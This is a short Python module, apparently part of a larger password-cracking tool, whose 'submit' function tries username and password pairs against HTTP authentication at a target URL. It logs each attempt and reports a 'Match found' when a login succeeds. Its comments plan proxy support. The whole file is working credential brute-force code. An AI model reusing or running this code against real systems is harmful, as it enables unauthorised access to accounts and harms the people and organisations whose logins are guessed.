from core import utils, tbrowser

# http://docs.python-requests.org/en/master/user/authentication/
# USING PROXY WITH REQUESTS https://stackoverflow.com/a/13395324
# TODO Using proxy
# TODO combine with reauth
# TODO use mechanize https://stackoverflow.com/a/40920030
# https://stackoverflow.com/a/4089075

def submit(options, loginInfo, creds, result):
	tryPassword, tryUsername = creds
	realm = loginInfo[0]
	for cred in list(result.queue):
		if tryUsername == cred[0]:
			return True # don't run if find password of username
			
	if options.verbose:
		utils.printf("Trying: %s:%s" %(tryUsername, tryPassword), 'norm')
	
	try:
		proc = tbrowser.startBrowser()
		proc.add_password(options.url, tryUsername, tryPassword, realm)
		proc.open(options.url)
		result.put([tryUsername, tryPassword])
		utils.printf("[*] Match found: %s" %([tryUsername, tryPassword]), "good") 

	except Exception as err:
		if err.code == 401:
			if options.verbose:
				utils.printf("[-] Failed %s" %(creds[::-1]), "bad")
		else:
			utils.printf("[x] %s: %s" %(err, creds[::-1]), "bad")